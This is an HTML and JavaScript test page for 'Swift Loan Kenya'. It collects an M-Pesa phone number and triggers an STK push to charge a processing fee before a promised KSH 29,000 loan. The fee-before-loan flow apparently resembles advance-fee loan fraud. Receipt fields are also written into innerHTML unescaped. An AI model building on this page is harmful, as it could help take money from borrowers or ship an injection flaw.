<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swift Loan Kenya - STK Push Test</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(45deg, #2196F3, #21CBF3);
            color: white;
            padding: 30px 20px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .form-section {
            padding: 30px 20px;
        }
        
        .loan-details {
            background: #f8f9ff;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            border-left: 4px solid #2196F3;
        }
        
        .loan-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .loan-item:last-child {
            margin-bottom: 0;
            font-weight: bold;
            color: #2196F3;
            border-top: 1px solid #e0e0e0;
            padding-top: 10px;
            margin-top: 10px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #2196F3;
        }
        
        .btn {
            width: 100%;
            background: linear-gradient(45deg, #2196F3, #21CBF3);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        .receipt {
            margin-top: 25px;
            background: #f8f9ff;
            border-radius: 15px;
            padding: 20px;
            border-left: 4px solid #4CAF50;
        }
        
        .receipt.error {
            border-left-color: #f44336;
            background: #fff5f5;
        }
        
        .receipt h3 {
            color: #4CAF50;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .receipt.error h3 {
            color: #f44336;
        }
        
        .receipt-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            padding: 5px 0;
        }
        
        .receipt-item strong {
            color: #333;
        }
        
        .status-note {
            background: #e8f5e8;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            font-style: italic;
            line-height: 1.5;
        }
        
        .receipt.error .status-note {
            background: #ffebee;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2196F3;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .flag {
            font-size: 20px;
        }

        /* Polling indicator animation */
        .polling-indicator {
            display: inline-block;
            animation: spin 2s linear infinite;
            color: #2196F3;
            margin-left: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Status update highlighting */
        .status-updated {
            animation: highlight 2s ease-in-out;
        }

        @keyframes highlight {
            0% { background-color: transparent; }
            50% { background-color: #fff3cd; }
            100% { background-color: transparent; }
        }
     .pdf-btn {
    display: inline-block;
    background: linear-gradient(45deg, #4CAF50, #81C784);
    color: white;
    border: none;
    padding: 15px;
    border-radius: 10px;
    font-size: 16px;
    font-weight: bold;
    text-align: center;
    cursor: pointer;
    margin-top: 15px;
    width: 100%;
    text-decoration: none;
    transition: transform 0.2s;
}

.pdf-btn:hover {
    transform: translateY(-2px);
    background: linear-gradient(45deg, #43A047, #66BB6A);
}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Swift Loan Kenya <span class="flag">🇰🇪</span></h1>
            <p>Quick & Secure Loan Processing</p>
        </div>
        
        <div class="form-section">
            <div class="loan-details">
                <div class="loan-item">
                    <span>Loan Amount:</span>
                    <span>KSH 29,000</span>
                </div>
                <div class="loan-item">
                    <span>Processing Fee:</span>
                    <span>KSH 1</span>
                </div>
                <div class="loan-item">
                    <span>Total to Pay:</span>
                    <span>KSH 1</span>
                </div>
            </div>
            
            <form id="loanForm">
                <div class="form-group">
                    <label for="phone">Phone Number (M-Pesa):</label>
                    <input type="tel" id="phone" placeholder="0712345678 or 712345678" required>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">
                    Request Loan & Pay Fee
                </button>
            </form>
            
            <div id="loading" class="loading" style="display: none;">
                <div class="spinner"></div>
                <p>Processing your request...</p>
            </div>
            
            <div id="receipt" style="display: none;"></div>
        </div>
    </div>

    <script>
    const API_BASE = 'https://dormainsearch.onrender.com';
    const LOAN_AMOUNT = 29000;
    const FEE_AMOUNT = 1;
    
    // Global variables for polling
    let currentTransactionRef = null;
    let pollingInterval = null;
    
    document.getElementById('loanForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const phone = document.getElementById('phone').value.trim();
        const submitBtn = document.getElementById('submitBtn');
        const loading = document.getElementById('loading');
        const receiptDiv = document.getElementById('receipt');
        
        if (!phone) {
            alert('Please enter your phone number');
            return;
        }
        
        // Show loading
        submitBtn.disabled = true;
        loading.style.display = 'block';
        receiptDiv.style.display = 'none';
        
        try {
            const response = await fetch(`${API_BASE}/pay`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: phone,
                    amount: FEE_AMOUNT,
                    loan_amount: LOAN_AMOUNT.toString()
                })
            });
            
            const data = await response.json();
            
            // Hide loading
            loading.style.display = 'none';
            
            if (data.success && data.receipt) {
                currentTransactionRef = data.reference;
                
                // Save transaction data
                localStorage.setItem('swiftloan_transaction_ref', data.reference);
                localStorage.setItem('swiftloan_receipt_data', JSON.stringify(data.receipt));
                
                // Update URL with transaction reference
                const url = new URL(window.location);
                url.searchParams.set('ref', data.reference);
                window.history.replaceState({}, '', url);
                
                displayReceipt(data);
                
                // Start polling for status updates
                if (data.receipt.status === 'pending') {
                    startPollingForUpdates(data.reference);
                }
            } else {
                displayReceipt(data);
                if (data.receipt && data.receipt.reference) {
                    localStorage.setItem('swiftloan_transaction_ref', data.receipt.reference);
                    localStorage.setItem('swiftloan_receipt_data', JSON.stringify(data.receipt));
                }
            }
        } catch (error) {
            console.error('Error:', error);
            loading.style.display = 'none';
            
            const errorData = {
                success: false,
                error: 'Network error. Please try again.',
                receipt: {
                    reference: 'ERROR-' + Date.now(),
                    transaction_id: null,
                    transaction_code: null,
                    amount: FEE_AMOUNT,
                    loan_amount: LOAN_AMOUNT.toString(),
                    phone: phone,
                    status: 'failed',
                    status_note: 'Your loan will remain on hold (expire) for 24 hours and will not be withdrawn.',
                    timestamp: new Date().toISOString()
                }
            };
            
            displayReceipt(errorData);
            
            if (errorData.receipt && errorData.receipt.reference) {
                localStorage.setItem('swiftloan_transaction_ref', errorData.receipt.reference);
                localStorage.setItem('swiftloan_receipt_data', JSON.stringify(errorData.receipt));
            }
        } finally {
            submitBtn.disabled = false;
        }
    });
    
    function displayReceipt(data) {
        const receiptDiv = document.getElementById('receipt');
        const receipt = data.receipt;
        
        if (!receipt) {
            receiptDiv.innerHTML = `
                <div class="receipt error">
                    <h3>❌ Error</h3>
                    <p>${data.error || 'Unknown error occurred'}</p>
                </div>
            `;
        } else {
            let statusIcon, receiptClass, statusText;
            
            switch(receipt.status) {
                case 'success':
                    statusIcon = '✅';
                    receiptClass = 'receipt';
                    statusText = 'Payment Successful';
                    break;
                case 'pending':
                    statusIcon = '⏳';
                    receiptClass = 'receipt';
                    statusText = 'Payment Pending';
                    break;
                case 'cancelled':
                    statusIcon = '❌';
                    receiptClass = 'receipt error';
                    statusText = 'Payment Cancelled';
                    break;
                case 'stk_failed':
                    statusIcon = '⚠️';
                    receiptClass = 'receipt error';
                    statusText = 'STK Push Failed';
                    break;
                case 'error':
                    statusIcon = '🚫';
                    receiptClass = 'receipt error';
                    statusText = 'System Error';
                    break;
                default:
                    statusIcon = '❌';
                    receiptClass = 'receipt error';
                    statusText = 'Failed/Cancelled';
            }
            
            receiptDiv.innerHTML = `
                <div class="${receiptClass}">
                    <h3>${statusIcon} ${statusText} <span id="pollingIndicator" class="polling-indicator" style="display: none;">🔄</span></h3>
                    
                    <div class="receipt-item"><span>Reference:</span><strong>${receipt.reference}</strong></div>
                    <div class="receipt-item"><span>Transaction ID:</span><strong>${receipt.transaction_id || 'N/A'}</strong></div>
                    <div class="receipt-item"><span>Transaction Code:</span><strong>${receipt.transaction_code || 'N/A'}</strong></div>
                    <div class="receipt-item"><span>${receipt.status === 'success' ? 'Fee Paid:' : receipt.status === 'pending' ? 'Fee Due:' : 'Fee Amount:'}</span><strong>KSH ${receipt.amount}</strong></div>
                    <div class="receipt-item"><span>Loan Amount:</span><strong>KSH ${receipt.loan_amount}</strong></div>
                    <div class="receipt-item"><span>Phone:</span><strong>${receipt.phone}</strong></div>
                    <div class="receipt-item"><span>Status:</span><strong style="color: ${receipt.status === 'success' ? '#4CAF50' : receipt.status === 'pending' ? '#2196F3' : '#f44336'}">${receipt.status}</strong></div>
                    <div class="receipt-item"><span>Time:</span><strong>${new Date(receipt.timestamp).toLocaleString()}</strong></div>
                    ${receipt.status_note ? `<div class="status-note">${receipt.status_note}</div>` : ''}
                </div>
            `;

            // ✅ Add PDF download button if payment was successful
            if (receipt.status === "success") {
                const pdfBtn = document.createElement("a");
                pdfBtn.href = `${API_BASE}/receipt/${receipt.reference}/pdf`;
                pdfBtn.target = "_blank";
                pdfBtn.className = "pdf-btn";
                pdfBtn.style.marginTop = "15px";
                pdfBtn.textContent = "📄 Download PDF Receipt";
                receiptDiv.appendChild(pdfBtn);
            }
        }
        
        receiptDiv.style.display = 'block';
    }
    
    // Polling for updates
    async function startPollingForUpdates(transactionRef) {
        console.log('Starting polling for transaction:', transactionRef);
        const indicator = document.getElementById('pollingIndicator');
        if (indicator) indicator.style.display = 'inline-block';
        
        if (pollingInterval) clearInterval(pollingInterval);
        
        pollingInterval = setInterval(async () => {
            try {
                const response = await fetch(`${API_BASE}/receipt/${transactionRef}`);
                const data = await response.json();
                
                if (data.success && data.receipt) {
                    localStorage.setItem('swiftloan_receipt_data', JSON.stringify(data.receipt));
                    displayReceipt({ success: true, receipt: data.receipt });
                    
                    if (['success', 'cancelled', 'failed'].includes(data.receipt.status)) {
                        clearInterval(pollingInterval);
                        pollingInterval = null;
                        if (indicator) indicator.style.display = 'none';
                    }
                }
            } catch (error) {
                console.error('Error polling for updates:', error);
            }
        }, 5000);
    }

    // (other existing functions: stopPolling, clearTransactionData, checkForExistingTransaction, etc. remain the same)
</script>
</body>
                    </html>
